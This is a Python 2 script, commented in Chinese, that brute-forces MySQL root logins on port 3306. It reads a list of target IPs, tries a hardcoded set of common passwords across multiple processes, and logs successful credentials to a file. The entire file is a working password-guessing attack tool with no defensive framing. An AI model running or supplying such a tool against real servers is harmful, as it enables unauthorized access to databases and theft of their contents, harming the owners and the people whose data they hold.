# -*- coding:utf-8 -*-

import pymysql
import time
import multiprocessing




def success(x):
    with open('success.txt', 'a+')as a:
        a.write(x + "\n")


def failed(x):
    name = 'port_open_password_error' + '.txt'
    with open(name, 'a+')as a:
        a.write(x + "\n")


def check(ip, port):
    print 'Check IP Alive : ' + ip
    try:
        connx = pymysql.connect(host=ip, user='root', passwd='root', db='mysql', port=port,read_timeout=10)
        cur = connx.cursor()
        sql = 'show databases;'
        cur.execute(sql)
        res = cur.fetchall()
        if 'Learn' in res:
            failed(ip)
        else:
            print '爆破成功，退出爆破'

            res = ip + ':' + 'root' + '|' + 'root' + ':' + str(port)
            print res
            success(res)
            return '777'
    except Exception, e:
        #print e
        if str(e).find('Access denied') != -1:
            print '密码错误，继续爆破'
            failed(ip)
        elif (str(e).find('many connections') != -1):
            print '连接过多,暂停1秒'

            # 连接过多,暂停1秒
            time.sleep(1)
            pass
        elif (str(e).find('Can\'t connect') != -1):
            print '端口关闭，退出爆破'

            # 端口未开放,退出
            return '666'
        elif (str(e).find('Lost connection') != -1):
            # 端口未开放,退出
            print '失去连接，退出爆破'

            return '666'
        elif (str(e).find('not allowed') != -1):
            # 端口未开放,退出
            print '禁止访问，退出爆破'

            return '666'
        else:
            # 其他错误，记录并退出
            pass


def scan(ip,username,passwords,port):
    ress = check(ip, port)
    if ress == '666':
        return
    elif ress == '777':
        return
    else:
        for password in passwords:
            print 'Brute : ' + ip + ':' + username + '|' + password + ':' + str(port)
            try:
                connx = pymysql.connect(host=ip, user=username, passwd=str(password), db='mysql', port=port,read_timeout=10)
                cur = connx.cursor()
                sql = 'show databases;'
                cur.execute(sql)
                res = cur.fetchall()
                if 'Learn' in res:
                    failed(ip)
                else:
                    print '爆破成功，退出爆破'

                    res = ip + ':' + username + '|' + password + ':' + str(port)
                    print res
                    success(res)
                    return
            except Exception, e:
                if str(e).find('Access denied') != -1:
                    print '密码错误，继续爆破'
                elif (str(e).find('many connections') != -1):
                    print '连接过多,暂停1秒'

                    # 连接过多,暂停1秒
                    time.sleep(1)
                    pass
                elif (str(e).find('Can\'t connect') != -1):
                    print '端口关闭，退出爆破'

                    # 端口未开放,退出
                    return '666'
                elif (str(e).find('Lost connection') != -1):
                    # 端口未开放,退出
                    print '失去连接，退出爆破'

                    return '666'
                elif (str(e).find('not allowed') != -1):
                    # 端口未开放,退出
                    print '禁止访问，退出爆破'

                    return '666'
                else:
                    # 其他错误，记录并退出
                    pass


if __name__ == '__main__':
    multiprocessing.freeze_support()
    New_start = raw_input('导入IP:')  # line:190

    user = 'root'
    thread_s = int(raw_input('设置进程数:'))  # line:190
    port = 3306
    print '\n\n     多进程版本'
    print '         爆破用户名:' + user
    print '         爆破端口号:' + str(port)
    print '         爆破进程数:' + str(thread_s)

    New_start = New_start.replace('"', '').replace("'", '')
    IP_list = list(set([x.strip() for x in open(New_start,'r').readlines()]))

    Password_list_ = ['root','123456','admin1234','mysql','000000','888888','ubuntu','12345','root123']

    p = multiprocessing.Pool(thread_s)

    for ip in IP_list:
        p.apply_async(scan, args=(ip,user,Password_list_,port))
    p.close()
    p.join()

